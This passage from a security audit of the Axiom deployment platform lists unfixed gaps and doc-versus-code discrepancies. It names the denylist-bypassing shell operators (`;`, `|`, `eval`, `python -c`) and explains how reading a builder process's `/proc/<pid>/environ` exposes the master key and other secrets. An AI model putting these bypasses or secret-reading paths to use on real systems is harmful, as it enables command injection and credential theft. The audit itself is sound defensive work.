| G5 | **No API rate limiting or account lockout** (T19, T20) | ABSENT | No rate-limit middleware exists in `services/engine/internal/api`. `POST /api/v1/auth/register` and `/auth/login` are public (`api/middleware.go:154-160`) and unbounded. The agent `RateLimiter` (`transport.go:117-159`) has zero non-test callers. |
| G6 | **No TLS on the Agent listener** (T29) | ABSENT | No implementation (#88). Currently masked by `refuseInbound`; becomes live the moment an inbound authenticator is injected. |
| G7 | **No Engine-to-Agent credential** (T5) | ABSENT | `bootstrap.go:255-258` injects `unavailableCredential`, which always returns `ErrNoCredential` (`:292-296`). Every deployment reaching `CREATE_RUNTIME` fails with `AGENT_NO_CREDENTIAL`. No deployment can reach LIVE. |
| G8 | **Command denylist is bypassable** (T13) | PARTIEL | `internal/profile/presets/presets.go:197-213` is a blocklist; `;`, `|`, `&`, `>`, `eval`, `apt-get`, `python -c` are not blocked. |
| G9 | **Unpinned base images and no dependency scanning** (T15, T16) | ABSENT | Floating tags `node:20-alpine`, `nginx:1.27-alpine`, `golang:1.23-alpine`; no `govulncheck`, `npm audit` or image scan in CI. |
| G10 | **Container isolation is Docker-default** (T27) | PARTIEL | No seccomp, AppArmor, `--cap-drop`, read-only rootfs or `no-new-privileges`. |
| G11 | **Reconciliation never runs** (T28) | NON CABLE | `services/agent/internal/bootstrap/bootstrap.go:189-196`: no boot call, no endpoint exposing the managed set. Orphans are permanent. |
| G12 | **PBKDF2 below current guidance** (T19) | PARTIEL | 200 000 iterations, self-labelled interim (`internal/auth/password.go:15-23`). |

Recommended V0.1 disposition: G2 is closed (E1, resolved during the audit). G3,
G4 and G5 are code defects on the authenticated API and runtime paths and
should be closed before the release gate. G1 is inherent to the product's
purpose and must be closed by an operational decision (documented build
isolation) plus an explicit accepted-risk sign-off, not by a claim of
mitigation. G6 and G7 are already covered by a fail-closed posture and are not
exploitable in V0.1.

## 10. Verification record

Verified against commit `427b630` on branch `main`, **plus the uncommitted
working-tree changes present at the time of writing** (19 files, +1526/-437,
implementing issue #145: mandatory `applicationId` on the agent protocol and a
strict `ownership.Scope`). `go build ./...` succeeds in `services/engine`. Every
`path:line` above was read in that state. Claims about instantiation were checked
against the composition roots `services/engine/internal/bootstrap/bootstrap.go`
and `services/agent/internal/bootstrap/bootstrap.go`, not against package
presence.

Because the working tree was being modified concurrently with this audit, line
numbers in the sections below were re-derived after the #145 changes landed. A
rebase onto the final commit may still shift them.

Known non-instantiated code paths found during this audit, listed so that a
future reader does not mistake them for controls:

- `services/engine/internal/agentclient/client.go` — `CredentialProvider` seam,
  no production implementation (`bootstrap.go:255-258`).
- `services/agent/internal/security/transport/transport.go:117-159` —
  `RateLimiter`, no caller.
- `services/agent/internal/recovery` `Reconciler` — constructed
  (`bootstrap.go:182-189`), never run.
- `services/agent/internal/logs` `Fetcher` — constructed
  (`bootstrap.go:208`), never invoked; no Engine endpoint consumes it.
- `services/agent/internal/metrics` — no HTTP endpoint.
- `services/engine/internal/secrets.Service.Resolve` — the runtime injection
  path for application configuration values has no caller outside tests, so
  stored configuration values are not yet delivered to a container.

## 11. Discrepancies found during the audit

The verbatim report is reproduced in the next section.

## Ecarts constatés (section 11, verbatim)

### E1. RESOLVED DURING THE AUDIT — the builder now gets an explicit minimal environment and `docs/architecture/deployment-policy.md:40` matches the code.

Both sides of the divergence are closed. The code now always sets an explicit
child environment: `cmd.Env = childEnv(os.Environ(), b.Env)` at
`services/engine/internal/build/builder.go:156-158`. `childEnv` (`:88-117`)
copies only the `buildEnvNames` allowlist (`:55-72`) from the parent, adds
caller-requested `ExecBuilder.Env` on top with override on key collision, and
falls back to `defaultPATH` (`:52-53`) when PATH is absent.
`docs/architecture/deployment-policy.md:40` now documents exactly that
behaviour. Non-regression tests: `TestExecBuilderNilEnvDoesNotInheritEngineEnvironment`,
`TestExecBuilderExplicitEnvIsCallerRequestedOnly` and `TestChildEnv`
(`services/engine/internal/build/builder_test.go:120`, `:142`, `:174`). T10 and
G2 are now EN PLACE.

The original write-up is kept below as the historical justification. The
quotation is `deployment-policy.md:40` as it read at audit time (since
reworded), and the `if b.Env != nil` branch it quotes is gone from `builder.go`:

The document states:

> Builds run in ephemeral 0700 workspaces with extracted (not executed)
> sources; builder child processes get an explicit minimal environment (#98).

The workspace half is true (`services/engine/internal/build/workspace/workspace.go:78`,
`0o700`). The environment half is false.
`services/engine/internal/bootstrap/bootstrap.go:250` constructs
`&build.ExecBuilder{Docker: cfg.Docker.Binary}` and never sets `Env`, so
`ExecBuilder.Env` is nil. At
`services/engine/internal/build/builder.go:85-87`:

```go
if b.Env != nil {
    cmd.Env = b.Env
}
```

With a nil `Env`, `exec.Cmd` inherits `os.Environ()`, so the `docker build`
child runs with `AXIOM_SECRET_KEY`, `DATABASE_URL`, `AXIOM_API_TOKEN` and
`AXIOM_GITHUB_CLIENT_SECRET` in its environment. The code comment at
`builder.go:42-45` documents this as intentional when nil; the composition root
is what leaves it nil. Any local process able to read `/proc/<pid>/environ` for
the builder (the Engine runs as root, so any local user on a multi-tenant host)
recovers the platform's master encryption key. This is G2.

### E2. `docs/architecture/secret-handling.md:62-63` claims the executor resolves configuration names into the build env. It does not.

The document states, as an integration point:

> Build env (#83) | `executor` resolves `plan.Runtime.Configuration` names via
> `appconfig.Service.Resolve` and passes env at `build.Input` construction time

and at `:64-65`:

> Runtime env | `CreateRuntimeRequest` carries resolved env entries to the agent
> (protocol §6 payload)

Neither is true.
`services/engine/internal/executor/model.go:36-41` declares
`CreateRuntimeRequest` with exactly `Operation`, `ImageRef`, `Container` and
`Port` — there is no `Env` field. `services/engine/internal/agentclient/client.go:225-234`
declares the wire `payload` with `ImageRef`, `Container`, `Port`, `Proxy`,
`Domain`, `TLS`, `Path` and `TimeoutSeconds` — no env. A grep for
`appconfig.Service.Resolve` / `.Resolve(` outside tests returns only the
definition at `services/engine/internal/secrets/appconfig.go:80` and the
unrelated `authz.Resolve` calls. Meanwhile the agent's Docker adapter supports
env explicitly (`services/agent/internal/runtime/docker/docker.go:201-205` and
`:327-329`) and the Engine never populates it. Consequence: an application can
store a configuration value through `PUT /api/v1/applications/{id}/configuration/{name}`,
it is sealed at rest, it is listed as `isSet` in the API, and it is then never
delivered to the running container. A deployment relying on a stored secret will
start with the variable unset.

### E3. RESOLVED DURING THE AUDIT — the Engine/agent wire contract gap is now closed, but two consequences were not re-verified here.

At the moment this audit began, the Engine's `agentclient.operation` struct had
no `ApplicationID` field while
`services/agent/internal/protocol/protocol.go:224-229` made `applicationId`
mandatory on every operation (`ErrIncompleteScope`). Every message the Engine
could build would therefore have been refused by the agent.

Uncommitted working-tree changes implementing issue #145 closed this: the wire
struct now carries `ApplicationID` (`client.go:271-273`), the value is resolved
from the deployment record rather than defaulted (`client.go:548-559`, refusing
with `CodeNoApplication` when the deployment names no application) and stamped
onto every operation (`client.go:464-475`).

Two consequences are noted rather than claimed as verified, because they landed
after the corresponding code paths were read:

- The Engine now performs an application lookup per operation
  (`client.go:548`). That is a new dependency on an application store inside the
  dispatch path; its failure mode is a refused operation, which is fail-closed.
- G3 below was re-checked after the change and still holds: the stricter scope
  assertion is not used by the Docker `Start`/`Stop`/`Remove` path.

### E4. RESOLVED DURING THE AUDIT — Traefik ownership is now deployment-scoped.

Recorded because the earlier state was weaker and the composition-root comment
was misleading. `ownership.Scope`
(`services/agent/internal/security/ownership/ownership.go:139-150`) now compares
both `axiom.application` and `axiom.deployment` against the operation scope, and
the Traefik adapter passes it (`traefik.go:269-273`). The earlier concern that
routing was gated only on `IsManaged` no longer applies.

### E5. `docs/architecture/boundaries.md:71` says the build "runs in isolated workspace (#98)". The workspace is isolated on disk; the build itself is not sandboxed.

The boundary table row reads:

> B6 | Repository code is never executed during analysis | analyzer reads files
> only; build runs in isolated workspace (#98)

The analysis half is true. The build half describes directory placement, not
execution isolation: `internal/build/engine.go:228-236` passes the repository
Dockerfile to the builder unchanged and `internal/build/builder.go:74-81` issues
`docker build` with no `--network=none`, no `--security-opt`, no resource
limits and no rootless builder. The workspace constrains where files land, not
what the builder may do. This is G1 and the wording should not be read as
claiming build isolation.

### E6. `docs/architecture/secret-handling.md:26` and the package comments present the application configuration store as a working secret boundary; the values are write-only and unreachable.

`services/engine/internal/secrets/appconfig.go:3-5` describes the service as
resolving values "into runtime environment entries at the injection boundary",
and `internal/security/secrets/store.go:20-23` states that `Get` is for
"components authorized to consume the value (the GitHub API client, the
build/runtime injection boundary)". The build/runtime injection consumer does not
exist (E2). `List` reports `Secret: true, IsSet: true` for every entry
(`appconfig.go:67`), so the API reports a usable configuration that no runtime
path consumes. Not a vulnerability, but it is a correctness gap that reads as a
security control and is not one.

### E7. `services/agent/internal/runtime/docker/docker.go:549-551` still documents `verifyManaged` as if it enforced the ownership scope, but it enforces only managed-ness.

The comment reads:

> verifyManaged enforces the ownership boundary for every mutation: the container
> must exist AND is Axiom-managed (ownership.IsManaged). Anything else is refused
> (ErrNotManaged or not-found) and never touched.

The first sentence is accurate as written, but it sits directly above the
`Start`, `Stop` and `Remove` path and invites the reading that the same
application+deployment scope enforced by `ownership.assertScope`
(`ownership.go:139-150`) applies here. It does not: `verifyManaged` returns
success for any Axiom-managed container regardless of scope, so those three
operations cross deployment boundaries on the same server. This is G3, and the
docstring is the reason a reader would not notice.

`services/agent/internal/bootstrap/bootstrap.go:161-164` compounds it by
stating that "the Docker adapter enforces the same boundary internally", which
was true before #145 and is no longer true.

## 13. Related documentation

- `docs/architecture/api-contract.md` — API contract, security boundary
- `docs/architecture/authorization.md` — the deliberate 404-hiding divergence
- `docs/architecture/deployment-policy.md` — deployment gates and policy rules
- `docs/architecture/agent-protocol.md` — protocol and security mapping
- `docs/architecture/secret-handling.md` — secret lifecycle
- `docs/adr/0005-traefik-reverse-proxy.md`, `docs/adr/0008-agent-engine-communication.md`

## 14. Abuse Controls (coherence with mounted code — #129 M7.5)

This section closes the gap between the threat-model title ("Abuse Controls") and its content. Every control below is verified against the mounted code at commit `d69bdea` and the working-tree state after `6017b35` (agent listener loopback, optional TLS, HMAC AD-0008, protocol `ApplicationID` separate).

### 14.1 Agent inbound listener — loopback, fail-closed, no TLS (#88)

- **Loopback binding:** `services/agent/internal/config/config.go:35` (`127.0.0.1:9401` by default) and `config.go:198-222` refuse any routable listener address unless `AXIOM_AGENT_ALLOW_PUBLIC_LISTENER=true` is explicitly set.
- **Fail-closed before body read:** The composition root injects `refuseInbound` (`services/agent/internal/bootstrap/bootstrap.go:212`); the listener authenticates before reading the body (`listener.go:112-119`) and refuses every request (`listener.go:47-52`). Nothing sensitive can ever be served through the listener today (`T4`, `T29`).
- **TLS deferred:** No TLS implementation exists (`listener.go`, `transport.go`). The fail-closed posture makes this non-exploitable in V0.1; it becomes exploitable the moment an inbound operation authenticator is wired (`T29`, `G6`).
- **Resource limits:** Body capped at 64 KiB (`listener.go:20-21`, `121-125`).

### 14.2 Engine → Agent transport — per-agent HMAC-SHA256 (ADR-0008)

- **Key management:** Per-agent 32-byte signing keys stored encrypted with AES-256-GCM (`docs/adr/0008-agent-engine-communication.md`, `agentkey.go`, `secrets/box.go:50-59`). The key is returned exactly once (register/rotate responses: `api/agent.go:132`, `:176`, `:221-228`) and never again (`agentkey` docs).
- **Canonical signing form (`AXIOM-HMAC-V1`):** `METHOD\nPATH\nAgentID\nVersion\nTimestamp\nNonce\nsha256(body)` (`agentclient/client.go:527-556`). Comparison is constant-time.
- **Verification before dispatch:** The agent verifies the `X-Axiom-Signature` header after strict decoding (`protocol.go:211-235`) and before dispatch (`dispatcher.go:315`). Unknown fields or malformed envelopes are refused (`listener.go:147-157`).
- **Scope binding:** Every operation carries `applicationId`, distinct from `deploymentId`. The Engine resolves it from the deployment record (`client.go:546-559`, refusing with `CodeNoApplication` when missing) and stamps both `axiom.application` and `axiom.deployment` labels (`agent-protocol.md`, `ownership/ownership.go:139-149`, `assertScope`). A missing or malformed `applicationId` is refused with `INCOMPLETE_SCOPE` (`protocol.go:361-365`), a security refusal distinct from syntax errors.

### 14.3 Webhook spoofing — none wired (T31)

- **No webhooks:** Repository-wide grep for `webhook` across `services/`, `schemas/` and the API contract returns 0 occurrences (`T31`). GitHub interaction is strictly user-initiated OAuth plus REST polling (`api/api.go:137-142`).
- **Required control if webhooks land:** Signature verification (`X-Hub-Signature-256`) and replay-bound delivery must be enforced before any webhook endpoint is registered, otherwise the platform gains an unauthenticated write path into the deployment pipeline (`T31`).

### 14.4 Build-resource abuse and resource exhaustion

- **No sandbox:** The repository Dockerfile is executed by the Docker daemon with no `--network=none`, no `--security-opt`, no resource limits (`builder.go:74-81`). The single largest residual risk (`G1`, `T11`).
- **Compensating controls:** Workspace isolation (`workspace.go:78`, `0o700`); archive extraction hardening (`workspace.go:149-152`, `201-212`); build timeout (10 min, `builder.go:59-63`); denylist on build/start commands (`presets/presets.go:197-213`, `T13`).
- **API rate limits absent (`T20`, `G5`):** No rate-limit middleware in `services/engine/internal/api`. The agent `RateLimiter` (`transport.go:117-159`) has zero non-test callers (`NON CABLE`). `POST /api/v1/auth/register` and `/auth/login` are public and unbounded.

### 14.5 Residual risks accepted for V0.1

| Residual risk | Threat / Gate | Status | Why |
|---|---|---|---|
| Unrestricted build execution | T11 / G1 | PARTIEL / accepted | By design; must be signed off operationally. |
| No API rate limiting or account lockout | T20 / G5 | ABSENT | No middleware; agent rate limiter non-cabled. |
| No TLS on agent listener | T29 / G6 | ABSENT / masked | Fail-closed (`refuseInbound`); becomes live when inbound auth is wired. |
| Command denylist bypassable | T13 / G8 | PARTIEL | Blocklist only; `eval`, `python -c`, `apt-get` not blocked. |
| Container isolation is Docker-default | T27 / G10 | PARTIEL | No seccomp/AppArmor/`--cap-drop`/read-only rootfs. |
| Reconciliation never runs | T28 / G11 | NON CABLE | `Reconcile` constructed (`bootstrap.go:182-189`), never called at boot (`189-196`) or elsewhere. |
